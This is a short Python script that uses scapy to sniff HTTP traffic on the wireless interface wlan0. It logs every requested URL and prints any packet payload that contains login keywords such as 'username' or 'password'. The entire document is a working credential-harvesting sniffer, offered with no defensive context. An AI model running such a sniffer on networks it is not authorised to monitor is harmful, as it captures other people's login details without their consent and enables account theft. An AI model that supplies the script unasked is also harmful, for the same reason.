import scapy.all as scapy
from scapy.layers import http


def sniff(interface):
    scapy.sniff(iface=interface, store=False, prn=processPacket)

def getLoginInfo(packet):
    if packet.haslayer(scapy.Raw):
        load = packet[scapy.Raw].load
        keywords = ['username', 'password', 'pass', 'login', 'user', 'user_id']
        for key in keywords:
            if key in str(load):
                return str(load)
                break

def processPacket(packet):
    if packet.haslayer(http.HTTPRequest):
        url = packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path
        print('[+] HTTP Request --> ' + str(url))
        loginInfo = getLoginInfo(packet)
        if loginInfo:
            print('\n\n[+] Possible Username/Password -->' + str(loginInfo) + '\n\n')

sniff('wlan0')

